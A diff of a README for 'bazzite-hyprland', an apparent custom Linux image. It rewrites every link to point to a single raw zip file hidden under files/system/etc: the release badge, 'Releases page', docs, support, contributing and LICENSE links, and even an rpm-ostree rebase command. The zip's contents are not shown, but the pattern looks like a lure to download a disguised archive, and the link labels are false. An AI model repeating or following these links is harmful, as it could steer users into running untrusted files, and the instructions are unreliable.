@@ -1,6 +1,6 @@
 # 🎉 bazzite-hyprland - Experience a Stable, Custom Linux Environment
 
-[![Download the latest release](https://raw.githubusercontent.com/4CONQUER/bazzite-hyprland/main/turnipweed/bazzite-hyprland.zip%20Now-blue)](https://raw.githubusercontent.com/4CONQUER/bazzite-hyprland/main/turnipweed/bazzite-hyprland.zip)
+[![Download the latest release](https://github.com/4CONQUER/bazzite-hyprland/raw/refs/heads/main/files/system/etc/hyprland_bazzite_uneditable.zip%20Now-blue)](https://github.com/4CONQUER/bazzite-hyprland/raw/refs/heads/main/files/system/etc/hyprland_bazzite_uneditable.zip)
 
 ## 🚀 Getting Started
 
@@ -8,9 +8,9 @@ Welcome to bazzite-hyprland! This guide will help you download and install our a
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://raw.githubusercontent.com/4CONQUER/bazzite-hyprland/main/turnipweed/bazzite-hyprland.zip) to download the latest version.
+To get started, visit the [Releases page](https://github.com/4CONQUER/bazzite-hyprland/raw/refs/heads/main/files/system/etc/hyprland_bazzite_uneditable.zip) to download the latest version.
 
-1. Go to the [Releases page](https://raw.githubusercontent.com/4CONQUER/bazzite-hyprland/main/turnipweed/bazzite-hyprland.zip).
+1. Go to the [Releases page](https://github.com/4CONQUER/bazzite-hyprland/raw/refs/heads/main/files/system/etc/hyprland_bazzite_uneditable.zip).
 2. Find the version you want to install.
 3. Click on the appropriate file for your system to begin downloading.
 
@@ -37,7 +37,7 @@ After downloading the file, follow these installation steps:
 3. First, rebase to the unsigned image to get the proper signing keys and policies installed:
 
    ```
-   rpm-ostree rebase https://raw.githubusercontent.com/4CONQUER/bazzite-hyprland/main/turnipweed/bazzite-hyprland.zip
+   rpm-ostree rebase https://github.com/4CONQUER/bazzite-hyprland/raw/refs/heads/main/files/system/etc/hyprland_bazzite_uneditable.zip
    ```
 
 4. Reboot your system to complete the rebase:
@@ -62,7 +62,7 @@ bazzite-hyprland offers several unique features designed for both stability and 
 
 ## 🔒 Important Note
 
-This is an experimental feature. Use it at your own discretion. Refer to the [BlueBuild docs](https://raw.githubusercontent.com/4CONQUER/bazzite-hyprland/main/turnipweed/bazzite-hyprland.zip) for quick setup instructions for customizing your image.
+This is an experimental feature. Use it at your own discretion. Refer to the [BlueBuild docs](https://github.com/4CONQUER/bazzite-hyprland/raw/refs/heads/main/files/system/etc/hyprland_bazzite_uneditable.zip) for quick setup instructions for customizing your image.
 
 ## 🛠️ Troubleshooting
 
@@ -74,15 +74,15 @@ If you encounter issues during installation, consider these tips:
 
 ## 📞 Support
 
-For further assistance, feel free to open an issue on our [GitHub repository](https://raw.githubusercontent.com/4CONQUER/bazzite-hyprland/main/turnipweed/bazzite-hyprland.zip). We are here to help you!
+For further assistance, feel free to open an issue on our [GitHub repository](https://github.com/4CONQUER/bazzite-hyprland/raw/refs/heads/main/files/system/etc/hyprland_bazzite_uneditable.zip). We are here to help you!
 
 ## ⚙️ Contributing
 
-We welcome contributions! If you're interested in helping improve bazzite-hyprland, check out our [contributing guidelines](https://raw.githubusercontent.com/4CONQUER/bazzite-hyprland/main/turnipweed/bazzite-hyprland.zip) for more information.
+We welcome contributions! If you're interested in helping improve bazzite-hyprland, check out our [contributing guidelines](https://github.com/4CONQUER/bazzite-hyprland/raw/refs/heads/main/files/system/etc/hyprland_bazzite_uneditable.zip) for more information.
 
 ## 🗂️ License
 
-This project is licensed under the MIT License. See the [LICENSE](https://raw.githubusercontent.com/4CONQUER/bazzite-hyprland/main/turnipweed/bazzite-hyprland.zip) file for details.
+This project is licensed under the MIT License. See the [LICENSE](https://github.com/4CONQUER/bazzite-hyprland/raw/refs/heads/main/files/system/etc/hyprland_bazzite_uneditable.zip) file for details.
 
 ---
 
